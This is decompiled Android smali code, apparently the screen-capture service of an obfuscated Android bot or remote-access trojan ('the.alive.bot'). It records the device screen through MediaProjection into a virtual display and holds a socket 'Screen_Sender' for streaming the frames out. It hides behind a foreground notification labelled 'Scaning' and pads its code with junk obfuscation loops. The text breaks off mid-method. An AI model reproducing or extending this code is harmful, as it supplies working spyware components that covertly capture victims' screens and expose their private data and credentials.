.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;
.super Landroid/app/Service;
.source "khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27.java"


# static fields
.field static final ACTION_RECORD:Ljava/lang/String; = "the.alive.bot.RECORD"

.field static final ACTION_SHUTDOWN:Ljava/lang/String; = "the.alive.bot.SHUTDOWN"

.field private static final CHANNEL_WHATEVER:Ljava/lang/String; = "Scaning"

.field static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultCode"

.field static final EXTRA_RESULT_INTENT:Ljava/lang/String; = "resultIntent"

.field public static FPS:I = 0x0

.field public static ISON:Z = false

.field private static final NOTIFY_ID:I = 0x26b2

.field public static PID:Ljava/lang/String; = null

.field public static Q:I = 0x0

.field public static Resolutions:Ljava/lang/String; = null

.field static final VIRT_DISPLAY_FLAGS:I = 0x2

.field public static ctd:Z

.field static display_height:Ljava/lang/String;

.field static display_width:Ljava/lang/String;

.field private static projection:Landroid/media/projection/MediaProjection;

.field public static syc:Ljava/lang/Object;

.field public static usd:Z

.field private static vdisplay:Landroid/hardware/display/VirtualDisplay;


# instance fields
.field public Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

.field _IDD:I

.field public bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field private handler:Landroid/os/Handler;

.field private final handlerThread:Landroid/os/HandlerThread;

.field private it:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;

.field private mgr:Landroid/media/projection/MediaProjectionManager;

.field mynotify:Landroid/app/Notification;

.field private resultCode:I

.field private resultData:Landroid/content/Intent;

.field private wmgr:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 455
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->syc:Ljava/lang/Object;

    const/4 v0, 0x0

    .line 456
    sput-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    .line 457
    sput-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->usd:Z

    sput-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ctd:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 41
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 58
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "ScreenThread"

    const/4 v2, -0x2

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handlerThread:Landroid/os/HandlerThread;

    const/4 v0, 0x0

    .line 68
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    const/16 v0, 0x1a14

    .line 71
    iput v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->_IDD:I

    .line 458
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->bts:Ljava/util/List;

    return-void
.end method

.method static synthetic access$000()Landroid/hardware/display/VirtualDisplay;
    .locals 1

    .line 41
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object v0
.end method

.method public static cancelnotification(Landroid/content/Context;I)V
    .locals 1

    const-string v0, "notification"

    .line 75
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/NotificationManager;

    .line 76
    invoke-virtual {p0, p1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method

.method private startCapture(Landroid/content/Context;)V
    .locals 9

    .line 872
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mgr:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->resultCode:I

    iget-object v2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->resultData:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->projection:Landroid/media/projection/MediaProjection;

    .line 874
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->ScreenWidth:Ljava/lang/String;

    const-string v1, "720"

    invoke-static {p1, v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->display_width:Ljava/lang/String;

    .line 875
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->ScreenHight:Ljava/lang/String;

    const-string v1, "1080"

    invoke-static {p1, v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->display_height:Ljava/lang/String;

    .line 876
    new-instance p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;

    invoke-direct {p1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;)V

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->it:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;

    .line 879
    new-instance p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$2;

    invoke-direct {p1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$2;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;)V

    .line 902
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->projection:Landroid/media/projection/MediaProjection;

    iget-object v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->it:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;

    .line 903
    invoke-virtual {v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;->getWidth()I

    move-result v2

    iget-object v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->it:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;

    invoke-virtual {v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;->getHeight()I

    move-result v3

    .line 904
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v1

    iget v4, v1, Landroid/util/DisplayMetrics;->densityDpi:I

    iget-object v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->it:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;

    .line 905
    invoke-virtual {v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sqqifqywluougvghuuilqtwdhonwiicjnzyzqhtvtibigdwhjz26;->getSurface()Landroid/view/Surface;

    move-result-object v6

    iget-object v8, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handler:Landroid/os/Handler;

    const-string v1, "Shooters"

    const/4 v5, 0x2

    const/4 v7, 0x0

    .line 902
    invoke-virtual/range {v0 .. v8}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    .line 913
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->projection:Landroid/media/projection/MediaProjection;

    iget-object v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handler:Landroid/os/Handler;

    invoke-virtual {v0, p1, v1}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method public static stopCapture()V
    .locals 6

    .line 789
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->projection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_7

    .line 794
    :try_start_0
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    .line 795
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    .line 798
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->projection:Landroid/media/projection/MediaProjection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_4

    :catch_0
    const/4 v0, 0x1

    .line 801
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 802
    :goto_0
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const/4 v3, 0x0

    const-string v4, "ask_battary"

    const-string v5, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v2, :cond_1

    .line 804
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 805
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 807
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 808
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 814
    :cond_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 817
    :cond_1
    :goto_1
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3

    .line 819
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 820
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 822
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 823
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 829
    :cond_2
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 832
    :cond_3
    :goto_2
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_5

    .line 834
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 835
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 837
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 838
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 844
    :cond_4
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 847
    :cond_5
    :goto_3
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_7

    .line 849
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 850
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_6

    .line 852
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 853
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    .line 859
    :cond_6
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    :cond_7
    :goto_4
    return-void
.end method


# virtual methods
.method getHandler()Landroid/os/Handler;
    .locals 1

    .line 783
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method getWindowManager()Landroid/view/WindowManager;
    .locals 1

    .line 779
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->wmgr:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 451
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 7

    const-string v0, "ask_battary"

    const-string v1, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    .line 80
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const/4 v2, 0x0

    const/4 v3, 0x1

    .line 83
    :try_start_0
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    .line 85
    iget-object v5, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    if-nez v5, :cond_0

    .line 88
    invoke-static {v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;->getInstance(Landroid/content/Context;)Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;

    move-result-object v5

    .line 89
    invoke-virtual {v5, v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;->createNotification(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object v4

    iput-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    .line 91
    :cond_0
    sget v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NOTIFICATION_ID:I

    iget-object v5, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, v4, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_4

    .line 93
    :catch_0
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    .line 94
    :goto_0
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_2

    .line 96
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 97
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 99
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 100
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_0

    .line 106
    :cond_1
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_0

    .line 109
    :cond_2
    :goto_1
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_4

    .line 111
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 112
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    .line 114
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 115
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_1

    .line 121
    :cond_3
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_1

    .line 124
    :cond_4
    :goto_2
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_6

    .line 126
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 127
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

